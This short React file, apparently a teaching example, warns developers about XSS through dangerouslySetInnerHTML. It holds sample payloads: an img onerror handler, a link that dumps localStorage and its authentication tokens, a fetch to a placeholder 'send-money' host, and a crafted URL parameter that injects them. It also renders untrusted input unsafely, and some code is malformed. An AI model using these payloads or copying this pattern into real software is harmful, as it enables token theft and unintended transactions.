//React provides dangerouslySetInnetHTML as a function and the input gets executed by the browser.
const input = "<img src='something' onerror='alert(\"foo!\")' />";

const input2 = (
  <a href="#" onclick="alert(JSON.stringify(localStorage))">
    Click me to view the local storage and all of the authentication tokens
    :)...
  </a>
);

const input3 = (
  <a href="#" onclick="fetch(http:awebsite/send-money).then(smt).then(smt)">
    Click me to start a promise chain and make unintended transactions :)...
  </a>
);

//A worse scenario => http:trustedwebsite.com/?default=<img src="something" onerror="fetch(http:awebsite/send-money).then(smt).then(smt)"
//This might work when the URL is parsed and the parameter is fed into dangerouslySetInnetHTML as the input!!!
//A crafted URL including promise chains to make unintended transactions while rendering an image which is not even visible to user!

class SetHTML extends React.Component {
  render() {
    return <div dangerouslySetInnerHTML={{ __html: input }} />;
  }
  //While using dangeourslySetInnerHTML, developers must be careful as it might be used by attackers in XSS.
}
